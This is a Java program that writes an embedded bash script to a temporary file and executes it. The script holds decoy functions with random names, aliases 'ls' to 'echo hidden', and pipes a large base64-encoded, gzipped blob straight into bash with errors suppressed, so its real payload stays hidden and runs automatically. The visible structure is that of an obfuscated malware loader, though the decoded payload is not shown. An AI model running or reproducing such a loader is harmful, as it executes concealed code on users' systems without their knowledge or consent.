import java.io.*;

public class Main {
    public static void main(String[] args) {
        try {

            String script = """
#!/bin/bash

vlwwv1uzu() { echo $((RANDOM * RANDOM)); }
vbaviotae() { for i in {1..3}; do :; done; }
vpayzorb2() { alias ls='echo hidden'; }

base64 -d <<'EOF' | gunzip | bash 2>/dev/null
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
EOF
""";


            File file = File.createTempFile("start", ".sh");
            try (FileWriter fw = new FileWriter(file)) {
                fw.write(script);
            }


            file.setExecutable(true);


            ProcessBuilder pb = new ProcessBuilder("bash", file.getAbsolutePath());
            pb.redirectErrorStream(true);
            Process p = pb.start();


            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) System.out.println(line);
            p.waitFor();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
